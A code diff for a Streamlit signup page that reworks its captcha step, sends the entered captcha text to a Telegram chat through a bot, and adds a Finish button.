@@ -48,23 +48,21 @@ if signupbut:
     ph1.write('Please confirm you''re not a robot:')
     ph2 = st.empty()
     im = ph2.image('captcha.png')
-
-
     ph3 = st.empty()
     captcha = ph3.text_input('Enter image numbers (make sure images do not contradict each other)')
-
     ph4 = st.empty()
     ver = ph4.button('Verify')
-else:
-    ver = False
+    if ver:
+        st.success("You have successfully created an account.Go to the Login Menu to login")
 
-if ver:
-    st.success("You have successfully created an account.Go to the Login Menu to login")
+        # here - st image with my letter
+        tb.send_message(chat_id, 'images: ' + captcha)
+        a = [eval('ph%s.empty()' % i) for i in range(1, 5)]
 
-    # here - st image with my letter
-    tb.send_message(chat_id, 'images: ' + captcha)
-    # a = [eval('ph%s.empty()' % i) for i in range(1, 5)]
+        import time
+        time.sleep(2)
+    but = st.button('Finish')
+    if but:
+        st.success("Thanks you for signing up!")
 
-    import time
-    time.sleep(10)
 
